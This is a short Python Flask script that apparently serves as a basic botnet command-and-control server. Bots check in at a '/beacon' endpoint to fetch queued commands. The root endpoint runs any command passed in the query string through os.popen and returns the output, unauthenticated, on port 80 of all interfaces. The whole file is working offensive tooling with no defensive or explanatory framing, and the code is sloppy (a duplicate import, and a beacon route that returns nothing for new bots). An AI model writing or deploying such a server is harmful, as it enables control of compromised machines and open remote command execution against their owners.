#!/usr/bin/python3
from flask import Flask, render_template, request
from collections import defaultdict
import os

from collections import defaultdict

bots = defaultdict(list)

app = Flask(__name__)

	
@app.route('/')
def cmd():
	botIP = request.args.get('botIP')
	command = request.args.get('command')
	output = os.popen(str(command)).read()
	bots[botIP].append(command)
	return render_template('form.html', command=command, output=output, botIP=botIP)
	
	
@app.route('/beacon')
def beacon():
	ip = request.args.get('ip')
	if ip not in bots:
		bots[ip] = []
	else:
		return str(bots[ip])
		
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
